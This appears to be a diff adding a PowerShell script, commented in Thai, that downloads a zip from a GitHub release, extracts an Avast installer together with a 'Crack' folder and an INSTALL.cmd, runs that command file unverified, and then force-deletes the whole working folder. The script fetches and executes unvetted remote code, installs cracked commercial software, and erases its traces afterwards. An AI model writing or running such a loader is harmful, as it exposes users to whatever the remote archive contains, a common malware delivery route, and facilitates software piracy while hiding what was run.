@@ -1,0 +1,74 @@
+# กำหนดเส้นทางโฟลเดอร์ทำงาน
+$targetPath = "C:\phwyverysad"
+$zipFile = "$targetPath\avast_premium.zip"
+$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/avast_premium.zip"
+
+# 1. สร้างโฟลเดอร์ C:\phwyverysad หากยังไม่มี
+if (!(Test-Path $targetPath)) {
+    New-Item -ItemType Directory -Path $targetPath | Out-Null
+    Write-Host "Created directory: $targetPath" -ForegroundColor Cyan
+}
+
+# 2. ดาวน์โหลดไฟล์โดยใช้ .NET (System.Net.WebClient)
+Write-Host "Downloading avast_premium.zip..." -ForegroundColor Yellow
+try {
+    $webClient = New-Object System.Net.WebClient
+    
+    # แสดงเปอร์เซ็นต์การดาวน์โหลด
+    $onDownloadProgress = {
+        param($sender, $e)
+        $percent = $e.ProgressPercentage
+        Write-Progress -Activity "Downloading Avast" -Status "$percent% Complete" -PercentComplete $percent
+    }
+    $webClient.add_DownloadProgressChanged($onDownloadProgress)
+    
+    $webClient.DownloadFileAsync($url, $zipFile)
+    while ($webClient.IsBusy) { Start-Sleep -Milliseconds 100 }
+    
+    Write-Host "Download completed." -ForegroundColor Green
+} catch {
+    Write-Host "Error during download: $($_.Exception.Message)" -ForegroundColor Red
+    exit
+}
+
+# 3. แตกไฟล์ avast_premium.zip
+Write-Host "Extracting files..." -ForegroundColor Yellow
+Expand-Archive -Path $zipFile -DestinationPath $targetPath -Force
+
+# 4. ย้ายไฟล์ที่ระบุออกมาไว้ที่รูทของ C:\phwyverysad
+$itemsToMove = @("INSTALL.cmd", "avast_premium_security_offline_setup.exe", "Crack")
+foreach ($itemName in $itemsToMove) {
+    # ค้นหาไฟล์หรือโฟลเดอร์ในทุกระดับแล้วย้ายมาที่รูทของ targetPath
+    $sourceItem = Get-ChildItem -Path $targetPath -Filter $itemName -Recurse | Select-Object -First 1
+    if ($sourceItem) {
+        $destPath = Join-Path $targetPath $itemName
+        if ($sourceItem.FullName -ne $destPath) {
+            Move-Item -Path $sourceItem.FullName -Destination $destPath -Force
+        }
+    }
+}
+
+# 5. ลบไฟล์ zip หลังจากแตกเสร็จแล้ว
+if (Test-Path $zipFile) {
+    Remove-Item -Path $zipFile -Force
+    Write-Host "Removed zip file." -ForegroundColor Cyan
+}
+
+# 6. รัน INSTALL.cmd และรอจนกว่าจะปิดตัวลง
+$cmdPath = Join-Path $targetPath "INSTALL.cmd"
+if (Test-Path $cmdPath) {
+    Write-Host "Running INSTALL.cmd... Please wait until it finishes." -ForegroundColor Magenta
+    Start-Process -FilePath $cmdPath -WorkingDirectory $targetPath -Wait
+    Write-Host "INSTALL.cmd has finished execution." -ForegroundColor Green
+} else {
+    Write-Host "Error: INSTALL.cmd not found!" -ForegroundColor Red
+}
+
+# 7. ลบโฟลเดอร์ C:\phwyverysad ทิ้งทั้งหมด
+Write-Host "Cleaning up... Removing $targetPath" -ForegroundColor Yellow
+if (Test-Path $targetPath) {
+    # หน่วงเวลาเล็กน้อยเพื่อให้ระบบปล่อยไฟล์ก่อนลบ
+    Start-Sleep -Seconds 3
+    Remove-Item -Path $targetPath -Recurse -Force
+    Write-Host "Cleanup completed successfully." -ForegroundColor Green
+}
